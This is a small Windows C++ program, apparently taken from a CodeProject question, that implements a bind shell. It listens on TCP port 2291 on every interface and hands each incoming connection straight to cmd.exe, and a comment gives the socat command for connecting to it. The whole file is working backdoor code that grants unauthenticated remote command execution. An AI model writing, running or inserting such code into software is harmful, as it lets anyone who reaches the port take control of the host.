// https://www.codeproject.com/Questions/1244856/Win-winsock-bind-reverse-shell-with-createprocess
// Client
// $ socat TCP4:localhost:2291 STDIO

#include <winsock2.h>
#include <iostream>

using namespace std;

#pragma comment(lib,"ws2_32.lib")

int main()
{
	SOCKET s, cs;
	WSADATA ws;
	struct sockaddr_in server, client;
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	int port = 2291;

	WSAStartup(MAKEWORD(2, 2), &ws);

	s = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

	server.sin_family = AF_INET;
	server.sin_port = htons(port);
	server.sin_addr.s_addr = INADDR_ANY;

	bind(s, (struct sockaddr*)&server, sizeof(server));
	listen(s, SOMAXCONN);
	cs = WSAAccept(s, NULL, NULL, NULL, 0);

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)cs;

	const string path = "cmd.exe";
	CreateProcessA(NULL, (LPSTR)path.c_str(), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

	return 0;
}
